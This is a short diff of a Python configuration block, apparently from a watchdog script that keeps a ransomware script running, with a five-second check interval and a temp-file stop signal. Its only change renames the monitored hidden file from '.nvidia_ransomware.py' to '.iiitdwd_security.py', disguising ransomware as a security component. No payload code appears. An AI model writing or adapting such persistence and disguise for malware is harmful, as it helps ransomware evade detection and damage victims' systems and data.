@@ -7,7 +7,7 @@ import tempfile
 import psutil
 
 # Configuration
-RANSOMWARE_SCRIPT = ".nvidia_ransomware.py"  # Filename only, will be in same dir as watchdog
+RANSOMWARE_SCRIPT = ".iiitdwd_security.py"  # Filename only, will be in same dir as watchdog
 CHECK_INTERVAL = 5  # Check every 5 seconds
 STOP_SIGNAL_FILE = os.path.join(tempfile.gettempdir(), "cerberus_stop_signal")
 
